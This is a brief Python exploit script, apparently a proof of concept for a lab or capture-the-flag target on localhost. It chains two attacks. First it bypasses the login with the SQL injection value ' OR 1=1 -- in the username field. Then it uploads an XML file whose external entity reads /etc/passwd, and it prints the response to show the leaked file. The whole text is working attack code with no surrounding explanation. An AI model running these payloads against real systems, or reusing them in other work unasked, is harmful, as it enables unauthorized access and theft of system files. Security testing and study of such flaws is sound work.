import requests

port = "5111"
url = f"http://localhost:{port}"

payload = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<post>
    <title>Blog Post Title</title>
    <content>
        &xxe;
    </content>
</post>"""

s = requests.Session()

r = s.post(url + "/login.php", {"username": "' OR 1=1 --", "password": "1"})

r = s.post(url + "/upload.php", files=[("xml", ("poc.xml", payload, 'text/xml'))])

r = s.get(url)
print(r.text)